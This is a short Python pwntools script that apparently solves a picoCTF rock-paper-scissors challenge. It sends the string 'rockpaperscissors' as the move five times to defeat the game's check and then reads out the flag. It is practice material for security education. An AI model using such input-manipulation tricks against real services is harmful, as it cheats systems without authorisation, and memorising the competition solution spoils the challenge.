#!/usr/bin/python3
from pwn import *

io = remote('saturn.picoctf.net', 53865)

payload = b"rockpaperscissors"

for i in range(5):
    io.sendlineafter(b"the program\r\n", b"1")
    io.sendlineafter(b"scissors):\r\n", payload)

log.info(io.clean())

io.recvuntil(b"flag!\r\n")

print(io.recvuntil(b"}"))
